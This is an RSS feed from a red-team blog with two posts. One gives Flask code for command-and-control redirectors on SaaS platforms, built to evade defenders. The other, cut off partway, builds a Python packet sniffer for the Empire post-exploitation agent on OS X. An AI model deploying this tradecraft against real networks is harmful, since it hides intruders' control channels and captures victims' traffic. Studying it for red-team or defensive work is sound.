<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Cyber Syndicates</title>
    <link>https://cybersyndicates.com/post/index.xml</link>
    <description>Recent content in Posts on Cyber Syndicates</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>CyberSyndicates</copyright>
    <lastBuildDate>Fri, 21 Apr 2017 21:39:41 -0500</lastBuildDate>
    <atom:link href="https://cybersyndicates.com/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Expand Your Horizon Red Team – Modern SaaS C2</title>
      <link>https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/</link>
      <pubDate>Fri, 21 Apr 2017 21:39:41 -0500</pubDate>
      
      <guid>https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/</guid>
      <description>

&lt;p&gt;Well to say that the past month or so for C2 infrastructure has been impactful, would be an understatement. Domain fronting has added yet another card to the deck of tricks the Red Team can deploy. Before this all took place, I was putting in some time to broaden the horizon of how the Red Team could deploy easy, yet effective C2. During this research, I found an interesting solution to this problem. Deploy our C2 redirectors on platforms that often are not intended to have console access. Hopefully to open the horizon of providers and IP space to operate / host from.&lt;/p&gt;

&lt;p&gt;Using Python Flask applications and providers that support WSGI, I was able to put together three new projects to demonstrate this TTP.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;TL;DR&lt;/em&gt; Source code and projects are at the end of the post. The following video shows from nothing to fully functional redirector in one minute flat:&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&#34;https://player.vimeo.com/video/213955360?autoplay=1&amp;loop=1&#34; width=&#34;640&#34; height=&#34;368&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;
&lt;p&gt;&lt;a href=&#34;https://vimeo.com/213955360&#34;&gt;One Minute C2 Redirector&lt;/a&gt; from &lt;a href=&#34;https://vimeo.com/user52367620&#34;&gt;Alexander Rymdeko-Harvey&lt;/a&gt; on &lt;a href=&#34;https://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;/p&gt;

&lt;p&gt;For reference we will be covering the following flask redirectors:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/flask_heroku_redirector&#34;&gt;https://github.com/killswitch-GUI/flask_heroku_redirector&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/flask_pythonanywhere_redirector&#34;&gt;https://github.com/killswitch-GUI/flask_pythonanywhere_redirector&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/flask_appengine_redirector&#34;&gt;https://github.com/killswitch-GUI/flask_appengine_redirector&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;native-expansion&#34;&gt;Native Expansion&lt;/h2&gt;

&lt;p&gt;Extensive work has been done by @bluscreenofjeff to filter HTTP traffic via apache mod_rewrite, working off this research I knew Python would also be able to handle this. Using a Python based platform the possibilities are nearly endless in conjunction with providers like Heroku. Sporting the CLI interface, Heroku commands can be used to update system environment variables remotely. This allows for extremely agile manipulation of the redirectors, without the need of multiple stages to filter requests.&lt;/p&gt;

&lt;h2 id=&#34;providers&#34;&gt;Providers&lt;/h2&gt;

&lt;p&gt;limited VPS provides has been an area of concern for myself in the past. Many of the big-name core VPS providers have gotten a bad reputation when it comes to IP blacklisting. Also, one single point of failure to discover all your C2 to pivot off could take place. Adding a few more options to the mix is a great way to throw off defenders, or help spread out your offensive end points. Plus, who is going guess you’re running you C2 from PythonAnywhere.&lt;/p&gt;

&lt;h2 id=&#34;deployment&#34;&gt;Deployment&lt;/h2&gt;

&lt;p&gt;Time is often limited and spending more time than necessary on C2 often means more time off target. A really cool benefit of using SaaS C2 is the ease of code deployments; often we see conventional use cases ranging from quickly standing up a file server to expanding existing infrastructure. This concept makes deploying code a cinch on many platforms, Heroku is a great example of this. If you walk through the setup process of the flask_heroku_redirector, you will notice simple environmental variables to push the configs (Ex. heroku config:set FORWARD_DOMAIN=cybersyndicates.com). This proves to be very powerful to quickly block, change or even pull down payloads you don’t want the Blue Team to hit.&lt;/p&gt;

&lt;h2 id=&#34;ip-space&#34;&gt;IP Space&lt;/h2&gt;

&lt;p&gt;A simple WHOIS query can say a ton about a domain, it will expose potential owner, address and corporation. We can setup WHOIS guard, but that is only half the picture; we need to also look at the IP space we originate from as well. An analyst determining if the traffic is malicious will be asking (Who owns this? Why is this client talking to it? What type of resource?). When we start talking about our operational footprint, considerations like where I host from is a big deal. Take for example third party C2, its near undetectable and will easily circumvent most analytics. The return on investment to blend in and pass the sniff test can be invaluable to sustaining a foot hold. The flask_appengine_redirector project is still dependent on other factors such as a domain name to match the ploy, but provides this initial top cover from operating in Google IP space, without the extent of third party C2.&lt;/p&gt;

&lt;h2 id=&#34;technical-overview&#34;&gt;Technical Overview&lt;/h2&gt;

&lt;p&gt;While each project has its own specifics from the platform dependent configuration files, the core code base is nearly identical across multiple platforms. The first thing you will notice is the common use of OS environment variables. This is common practice for encryption, secret and private keys on these platforms. We use them to allow us to quickly change and alter our C2  redirector, either through the web interface or provider CLI.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# STATIC VAR
__DEBUG = bool(os.environ.get(&#39;DEBUG&#39;, True))
__FORWARD_DOMAIN = str(os.environ.get(&#39;FORWARD_DOMAIN&#39;, &#39;cybersyndicates.com&#39;))
__CURRENT_DOMAIN = str(os.environ.get(&#39;CURRENT_DOMAIN&#39;, &#39;test-1234555555.herokuapp.com&#39;))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Flask is a great example and standard configuration looks as follows:&lt;/p&gt;

&lt;p&gt;set port to forward on (Defaults to 80):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;heroku config:set PORT=80&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;set debug output to the log outlet (Defaults to True):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;heroku config:set DEBUG=True&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;set forward C2 domain (Where to redirect to):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;heroku config:set FORWARD_DOMAIN=cybersyndicates.com&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;set redirector domain (Incoming domain name):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;heroku config:set CURRENT_DOMAIN=tranquil-dawn-50102.herokuapp.com&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Once you move on to the core code components you will notice that I also added in a “debug” class to feed your request to. This is very helpful to see the data being received by your C2 since you will not have tools like tcpdump available.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class debug_request():
    &amp;quot;&amp;quot;&amp;quot;
    debug printing of request object.
    &amp;quot;&amp;quot;&amp;quot;
    def __init__(self):
        # setup DB connection
        # TODO: add db support
        # self.conn = sql
        pass

    def log_request(self, request_obj):
        &amp;quot;&amp;quot;&amp;quot;
        used to log full request to db or other logging outlet
        &amp;quot;&amp;quot;&amp;quot;
        # TODO: build full logic for request
        req = self.build_json(request_obj)
        pass
    
    def print_request(self, request_obj):
        &amp;quot;&amp;quot;&amp;quot;
        print the entire request in json pprint
        &amp;quot;&amp;quot;&amp;quot;
        print self.build_json(request_obj)

    def build_json(self, request_obj):
        &amp;quot;&amp;quot;&amp;quot;
        build the json obj
        &amp;quot;&amp;quot;&amp;quot;
        json_dict = {}
        json_dict[&#39;url&#39;] = request_obj.url
        json_dict[&#39;method&#39;] = request_obj.method
        json_dict[&#39;headers&#39;] = {key: value for (key, value) in request.headers if key != &#39;Host&#39;}
        json_dict[&#39;method&#39;] = request_obj.cookies
        json_dict[&#39;data&#39;] = request_obj.data
        return json.dumps(json_dict, ensure_ascii=False, indent=4, sort_keys=True)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;you should expect to see some verbose logging until you set your debug to false; here is an example of that logging console:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;2017-04-21T22:05:50.027323+00:00 app[web.1]: proxy response: &amp;lt;Response 14718 bytes [200 OK]&amp;gt;
2017-04-21T22:05:50.098293+00:00 app[web.1]: {
2017-04-21T22:05:50.098295+00:00 app[web.1]:     &amp;quot;data&amp;quot;: &amp;quot;&amp;quot;,
2017-04-21T22:05:50.098296+00:00 app[web.1]:     &amp;quot;headers&amp;quot;: {
2017-04-21T22:05:50.098297+00:00 app[web.1]:         &amp;quot;Accept&amp;quot;: &amp;quot;image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5&amp;quot;,
2017-04-21T22:05:50.098298+00:00 app[web.1]:         &amp;quot;Accept-Encoding&amp;quot;: &amp;quot;gzip, deflate&amp;quot;,
2017-04-21T22:05:50.098299+00:00 app[web.1]:         &amp;quot;Accept-Language&amp;quot;: &amp;quot;en-us&amp;quot;,
2017-04-21T22:05:50.098299+00:00 app[web.1]:         &amp;quot;Connect-Time&amp;quot;: &amp;quot;0&amp;quot;,
2017-04-21T22:05:50.098300+00:00 app[web.1]:         &amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;,
2017-04-21T22:05:50.098301+00:00 app[web.1]:         &amp;quot;Cookie&amp;quot;: &amp;quot;_ga=GA1.3.1533808371.1492657513; __atuvc=1%7C16&amp;quot;,
2017-04-21T22:05:50.098301+00:00 app[web.1]:         &amp;quot;Referer&amp;quot;: &amp;quot;https://vast-meadow-71019.herokuapp.com/&amp;quot;,
2017-04-21T22:05:50.098302+00:00 app[web.1]:         &amp;quot;Total-Route-Time&amp;quot;: &amp;quot;0&amp;quot;,
2017-04-21T22:05:50.098303+00:00 app[web.1]:         &amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30&amp;quot;,
2017-04-21T22:05:50.098303+00:00 app[web.1]:         &amp;quot;Via&amp;quot;: &amp;quot;1.1 vegur&amp;quot;,
2017-04-21T22:05:50.098304+00:00 app[web.1]:         &amp;quot;X-Forwarded-For&amp;quot;: &amp;quot;108.44.160.205&amp;quot;,
2017-04-21T22:05:50.098305+00:00 app[web.1]:         &amp;quot;X-Forwarded-Port&amp;quot;: &amp;quot;443&amp;quot;,
2017-04-21T22:05:50.098305+00:00 app[web.1]:         &amp;quot;X-Forwarded-Proto&amp;quot;: &amp;quot;https&amp;quot;,
2017-04-21T22:05:50.098306+00:00 app[web.1]:         &amp;quot;X-Request-Id&amp;quot;: &amp;quot;514fade7-8222-494f-92f0-388100a01a0f&amp;quot;,
2017-04-21T22:05:50.098307+00:00 app[web.1]:         &amp;quot;X-Request-Start&amp;quot;: &amp;quot;1492812350097&amp;quot;
2017-04-21T22:05:50.098307+00:00 app[web.1]:     },
2017-04-21T22:05:50.098308+00:00 app[web.1]:     &amp;quot;method&amp;quot;: {
2017-04-21T22:05:50.098308+00:00 app[web.1]:         &amp;quot;__atuvc&amp;quot;: &amp;quot;1%7C16&amp;quot;,
2017-04-21T22:05:50.098309+00:00 app[web.1]:         &amp;quot;_ga&amp;quot;: &amp;quot;GA1.3.1533808371.1492657513&amp;quot;
2017-04-21T22:05:50.098310+00:00 app[web.1]:     },
2017-04-21T22:05:50.098310+00:00 app[web.1]:     &amp;quot;url&amp;quot;: &amp;quot;https://vast-meadow-71019.herokuapp.com/logo.png&amp;quot;
2017-04-21T22:05:50.098311+00:00 app[web.1]: }
2017-04-21T22:05:50.098316+00:00 app[web.1]: https://cybersyndicates.com/logo.png
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One of the powerful aspects of Flask is the ability to use “Custom Decorators” with your Flask app routes. We will be intercepting a “request” object before it hits a flask route. Using a custom decorator we are able to achieve this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;@app.before_request
@proxy_required
def log_request():
    &amp;quot;&amp;quot;&amp;quot;
    log request and force proxy
    &amp;quot;&amp;quot;&amp;quot;
    try:
        log_outlet = {&#39;address&#39; : request.remote_addr, &#39;url&#39; : request.base_url}
        print log_outlet
    except:
        return make_response(jsonify({&#39;error&#39;: &#39;somthing went wrong (contact admin)&#39;}), 400)

@app.route(&#39;/&amp;lt;string:request_path&amp;gt;&#39;, methods=[&#39;GET&#39;])
def request_forward(request_path):
    return &amp;quot;works/n&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you look at the above code we have a custom decorator declared as “@app.before_request”, this tells flask to run this code route before sending to the standard route views. Using a custom decorator we “wrap” this function with “@proxy_required”, to intercept the request and manipulate the data:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def proxy_required(func):
    &amp;quot;&amp;quot;&amp;quot;
    proxy http requests to forward domain (our real C2).
    &amp;quot;&amp;quot;&amp;quot;
    @wraps(func)
    def wrapper(*args, **kwargs):
        &amp;quot;&amp;quot;&amp;quot;
        wrapper function with decorator
        &amp;quot;&amp;quot;&amp;quot;
        try:
            if __DEBUG:
                debug_req.print_request(request)
                print request.url.replace(__CURRENT_DOMAIN, __FORWARD_DOMAIN)
            # setup our proxy for C2
            resp = requests.request(
                method=request.method,
                url=request.url.replace(__CURRENT_DOMAIN, __FORWARD_DOMAIN),
                headers={key: value for (key, value) in request.headers if key != &#39;Host&#39;},
                data=request.get_data(),
                cookies=request.cookies,
                allow_redirects=True)
            excluded_headers = [&#39;content-encoding&#39;, &#39;content-length&#39;, &#39;transfer-encoding&#39;, &#39;connection&#39;]
            headers = [(name, value) for (name, value) in resp.raw.headers.items()
                       if name.lower() not in excluded_headers]
            response = Response(resp.content, resp.status_code, headers)
            print &amp;quot;proxy response: %s&amp;quot; % (response)
            return response
            if not response:
                # FORWARD RESPONSE TO SERVER
                return func(*args, **kwargs)
        except:
            return make_response(jsonify({&#39;error&#39;: &#39;somthing went wrong (contact admin)&#39;}), 400)
    return wrapper
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The code will replace the requested URL with the forwarded domain or IP, fix up the request object by pulling the header values and data within the request to build a new request object. Using this object we send it to designated server with all the data and proper headers. This acts as a proxy and returns this entire response object to the original requester.&lt;/p&gt;

&lt;p&gt;Here is a great video of it in action with CobaltStrike:&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&#34;https://player.vimeo.com/video/214249797?autoplay=1&amp;loop=1&#34; width=&#34;640&#34; height=&#34;368&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;
&lt;p&gt;&lt;a href=&#34;https://vimeo.com/214249797&#34;&gt;Flask Proxy C2 Redirector&lt;/a&gt; from &lt;a href=&#34;https://vimeo.com/user52367620&#34;&gt;Alexander Rymdeko-Harvey&lt;/a&gt; on &lt;a href=&#34;https://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;/p&gt;

&lt;p&gt;Flask PythonAnywhere C2 redirector template:
&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/flask_pythonanywhere_redirector&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;Google App Engine Flask C2 redirector:
&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/flask_appengine_redirector&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;flask heroku C2 redirector template:
&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/flask_heroku_redirector&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OS X Packet Capture &amp; Empire</title>
      <link>https://cybersyndicates.com/2017/02/os-x-packet-capture--empire/</link>
      <pubDate>Sun, 12 Feb 2017 21:39:41 -0500</pubDate>
      
      <guid>https://cybersyndicates.com/2017/02/os-x-packet-capture--empire/</guid>
      <description>

&lt;p&gt;Recently I have been preparing for some additional support for Empire and the Python agent. With that comes some new modules cooking, finally getting to porting the Linux sniffer over to OS X. While some of you know it’s easy with raw sockets on the Linux side. OS X does not natively support this, and you often see question that relate to how to get this to work on the OS X side.&lt;/p&gt;

&lt;h2 id=&#34;empire&#34;&gt;Empire&lt;/h2&gt;

&lt;p&gt;Empire will be seeing a major release here in the coming months, moving from a single-track windows agent to a platform for OS X, Linux and Windows. Making it extremely agile.&lt;/p&gt;

&lt;p&gt;TL;DR: The following video is the new OS X sniffer module in action&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&#34;https://player.vimeo.com/video/203695405?autoplay=1&amp;loop=1&amp;color=ffffff&#34; width=&#34;640&#34; height=&#34;400&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;
&lt;p&gt;&lt;a href=&#34;https://vimeo.com/203695405&#34;&gt;Empire OS X Sniffer Module&lt;/a&gt; from &lt;a href=&#34;https://vimeo.com/user52367620&#34;&gt;Alexander Rymdeko-Harvey&lt;/a&gt; on &lt;a href=&#34;https://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;/p&gt;

&lt;h2 id=&#34;native-support&#34;&gt;Native Support&lt;/h2&gt;

&lt;p&gt;Native code capability is crucial due the constraints we have, while we do have Python package imports now from memory there is always limitations.  The Empire dev team often focuses on making all modules as cross capable and native.&lt;/p&gt;

&lt;h2 id=&#34;extend-python-with-ctypes-and-dylib&#34;&gt;Extend Python with cTypes and Dylib!&lt;/h2&gt;

&lt;p&gt;One of the major benefits to python is its low-level support, and with cTypes we have those bindings! We can call the standard C library and much more dynamically. Let’s take a look at some the library’s shipped with OS X:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ls /usr/lib/ | grep “lib”
...
libpq.5.dylib
libpq.dylib
libprequelite.dylib
libproc.dylib
libpthread.dylib
libpython.dylib
libpython2.6.dylib
libpython2.7.dylib
libquit.dylib
libreadline.dylib
libresolv.9.dylib
libresolv.dylib
librpcsvc.dylib
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next we can inspect our .dyblib using &lt;code&gt;nm&lt;/code&gt;  and dumping the export functions in the dynamic library:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ nm -gU /lib/usr/libpcap.dylib 
...
0000000000018c93 T _pcap_dump
000000000001b28c T _pcap_ng_get_simple_packet_fields
000000000001e15a T _pcap_ng_init_section_info
0000000000014088 T _pcap_ng_offline_read
0000000000013e90 T _pcap_ng_open_offline
0000000000011a4c T _pcap_not_initialized
0000000000012f69 T _pcap_offline_filter
0000000000013f7c T _pcap_offline_read
0000000000011b1a T _pcap_oneshot
0000000000012ec6 T _pcap_open_dead
0000000000012e0c T _pcap_open_dead_with_tstamp_precision
00000000000122e3 T _pcap_open_live
0000000000013c13 T _pcap_open_offline
000000000001249b T _pcap_open_offline_common
...
0000000000011ed3 T _pcap_set_snaplen
0000000000011fc1 T _pcap_set_timeout
00000000000120f7 T _pcap_set_tstamp_precision
0000000000011fff T _pcap_set_tstamp_type
0000000000010c9f T _pcap_set_want_pktap
0000000000012c37 T _pcap_setdirection
0000000000012c29 T _pcap_setfilter
0000000000012b2f T _pcap_setnonblock
0000000000012b78 T _pcap_setnonblock_fd
000000000001ca05 T _pcap_setup_pktap_interface
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now comes the ability to extend Python with cTypes and C convention calling. according to Python docs: &amp;ldquo;cdll loads libraries which export functions using the standard cdecl calling convention&amp;rdquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;class ctypes.CDLL(name, mode=DEFAULT_MODE, handle=None, use_errno=False, use_last_error=False)

Instances of this class represent loaded shared libraries. Functions in these
libraries use the standard C calling convention, and are assumed to return int.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the code I also setup the standard C lib for future use or other functions you may need such as &lt;code&gt;mmap&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;OSX_PCAP_DYLIB = &#39;/usr/lib/libpcap.A.dylib&#39;
OSX_LIBC_DYLIB = &#39;/usr/lib/libSystem.B.dylib&#39;
...
libc = ctypes.CDLL(OSX_LIBC_DYLIB, use_errno=True)
...
pcap = ctypes.CDLL(OSX_PCAP_DYLIB, use_errno=True)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;libpcap-standard-c-program&#34;&gt;libpcap - Standard C Program&lt;/h2&gt;

&lt;p&gt;using &lt;a href=&#34;http://www.devdungeon.com/content/using-libpcap-c&#34;&gt;http://www.devdungeon.com/content/using-libpcap-c&lt;/a&gt; guide on libcap is a great starting point for most. Here is what is impended in Python:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;time.h&amp;gt;
#include &amp;lt;pcap.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;netinet/if_ether.h&amp;gt;

void print_packet_info(const u_char *packet, struct pcap_pkthdr packet_header);

int main(int argc, char *argv[]) {
    char *device;
    char error_buffer[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    const u_char *packet;
     struct pcap_pkthdr packet_header;
    int packet_count_limit = 1;
    int timeout_limit = 10000; /* In milliseconds */

    device = pcap_lookupdev(error_buffer);
    if (device == NULL) {
        printf(&amp;quot;Error finding device: %s\n&amp;quot;, error_buffer);
        return 1;
    }

    /* Open device for live capture */
    handle = pcap_open_live(
            device,
            BUFSIZ,
            packet_count_limit,
            timeout_limit,
            error_buffer
        );

     /* Attempt to capture one packet. If there is no network traffic
      and the timeout is reached, it will return NULL */
     packet = pcap_next(handle, &amp;amp;packet_header);
     if (packet == NULL) {
        printf(&amp;quot;No packet found.\n&amp;quot;);
        return 2;
    }

    /* Our function to output some info */
    print_packet_info(packet, packet_header);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;libpcap-python-implementation&#34;&gt;libpcap - Python Implementation&lt;/h2&gt;

&lt;p&gt;Follow along for the explanation and breakdown or skip to the end for code:&lt;/p&gt;

&lt;h3 id=&#34;interface-device-selection&#34;&gt;Interface Device Selection&lt;/h3&gt;

&lt;p&gt;The next step is to obtain a handle to the interface of choice, as you will see libpcap follows a standard calling convention for setup. We will be using:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pcap_lookupdev(): finds the default device on which to capture

Returns a pointer  to a string giving the name of a
network device suitable for use with pcap_create() and pcap_activate(),
or with  pcap_open_live(),  and with pcap_lookupnet()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To set this up in Python we need to create a pcap_lookupdev() object and set the res type, this is because by default functions are assumed to return the C int type.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# pcap is our pointer to the dylib function
pcap_lookupdev = pcap.pcap_lookupdev
# set the return type to a C char pointer (string)
pcap_lookupdev.restype = ctypes.c_char_p
# now get our device device to capture on
dev = pcap.pcap_lookupdev()
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;interface-device-info&#34;&gt;Interface Device Info&lt;/h3&gt;

&lt;p&gt;We have an option to get some data on the device of choice. Using the pcap_lookupnet function we can get some debug data if necessary.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pcap_lookupnet(): find the IPv4 network number and netmask for a device  

int pcap_lookupnet(const char *device, bpf_u_int32 *netp, 
    bpf_u_int32 *maskp, char *errbuf);

Is used to determine the IPv4 network number and mask associated with the
network device. Both netp and maskp are bpf_u_int32 pointers
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We will need to use the proper cTypes unsigned int for the return pointers. We can do this by using cTypes primitive C compatible data types.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;net = ctypes.c_uint()
mask = ctypes.c_uint()
pcap.pcap_lookupnet(dev,ctypes.byref(net),ctypes.byref(mask),err_buf)
if DEBUG:
    print &amp;quot;* Device IP to bind: %s&amp;quot; % net
    print &amp;quot;* Device net mask: %s&amp;quot; % mask
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;packet-capture-handle&#34;&gt;Packet Capture Handle&lt;/h3&gt;

&lt;p&gt;Once we have a interface device we need to obtain a capture handle to use with various libpcap capture types. For this we will use the pcap_open_live function.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pcap_open_live(): open a device for capturing  

pcap_t *pcap_open_live(const char *device, int snaplen,
        int promisc, int to_ms, char *errbuf);
Is used to obtain a packet capture handle to look at packets on the network.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We will need to provide the following to the function:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;device = string that specifies the network device to open
snaplen = specifies the snapshot length to be set on the handle
promisc = specifies if the interface is to be put into promiscuous mode
to_ms = specifies the packet buffer timeout in milliseconds
errbuf = if provided 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once again we will need to setup the return type, the only difference here is that the return type is pcap_t * structure on success. To do this we will use the ctypes.POINTER() function, which we will provide the type as well:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ctypes.POINTER(type)

This factory function creates and returns a new ctypes pointer type.
Pointer types are cached and reused internally, so calling this function
repeatedly is cheap. type must be a ctypes type.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now implemented in Python:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# static values 
PCAP_ERRBUF_SIZE = 256
PCAP_CAPTURE_COUNT = 1000
promisc = ctypes.c_int(1)
# setup the return pointer 
pcap_open_live = pcap.pcap_open_live
pcap_open_live.restype = ctypes.POINTER(ctypes.c_void_p)
# get pcap_handle pointer
pcap_handle = pcap.pcap_open_live(dev, 1024, promisc, timeout_limit, err_buf)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;check-our-handle&#34;&gt;Check Our Handle&lt;/h3&gt;

&lt;p&gt;As all good programing practices say we should check our handle, this will insure we have a handle/interface that can go into monitor mode. To do this we will use pcap_can_set_rfmon.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pcap_can_set_rfmon(): checks whether monitor mode could be set on a capture
handle when the handle is activated

pcap_set_rfmon() returns 0 if monitor mode could not be set, 
1 if monitor mode could be se
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Impmentation:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pcap_can_set_rfmon = pcap.pcap_can_set_rfmon
pcap_can_set_rfmon.argtypes = [ctypes.c_void_p]
if (pcap_can_set_rfmon(pcap_handle) == 1):
    if DEBUG:
        print &amp;quot;* Can set interface in monitor mode&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;setup-dump-file&#34;&gt;Setup Dump File&lt;/h3&gt;

&lt;p&gt;If you take a look at the raw socket sniffer in Empire &lt;a href=&#34;https://github.com/killswitch-GUI/NIX-Sniffer-Examples/blob/master/linux-socket-sniffer.py#L40&#34;&gt;https://github.com/killswitch-GUI/NIX-Sniffer-Examples/blob/master/linux-socket-sniffer.py#L40&lt;/a&gt; it creates the pcap header and file header manually. Using the libpcap lib we can use pcap_dump_open() to handle this for us. Using the pcap_dump() function we can call this pointer for the packet handling.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pcap_dump_open(): open a file to which to write packets  

pcap_dumper_t *pcap_dump_open(pcap_t *p, const char *fname);
    is called to open a ``savefile&#39;&#39; for writing. fname specifies the name of
    the file to open. The file will have the same format as those used by
    tcpdump(1) and tcpslice(1). The name &amp;quot;-&amp;quot; is a synonym for stdout.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;implementation:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PCAP_FILENAME = &#39;test.pcap&#39;
# setup pointer
pcap_dump_open = pcap.pcap_dump_open
pcap_dump_open.restype = ctypes.POINTER(ctypes.c_void_p)
# get pointer 
pcap_dumper_t = pcap.pcap_dump_open(pcap_handle,PCAP_FILENAME)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;pcap-capture&#34;&gt;Pcap Capture&lt;/h3&gt;

&lt;p&gt;All the prior functionality is setup; we will need to setup a loop for packet capture. We can do this a few ways within libpcap, the first is using pcap_next_ex() or pcap_loop(). Using pcap_loop requires a callback to be setup, which I was unable to do properly and have must of it commented out. So, if you know how to do that, some help would be great. For the mean time, we will use pcap_next_ex in a loop since its blocking.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pcap_next_ex():read the next packet from a pcap_t  

int pcap_next_ex(pcap_t *p, struct pcap_pkthdr **pkt_header,
    const u_char **pkt_data);

reads the next packet and returns a success/failure indication. If the packet
was read without problems, the pointer pointed to by the pkt_header argument
is set to point to the pcap_pkthdr struct for the packet, and the pointer
pointed to by the pkt_data argument is set to point to the data in the packet.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this implementation we will also use custom cTypes structures, just like you would see in a C struc. Using this method we will setup a pcap_pkthdr() structure to populate, we than get a cTypes pointer to feed to pcap_next_ex().&lt;/p&gt;

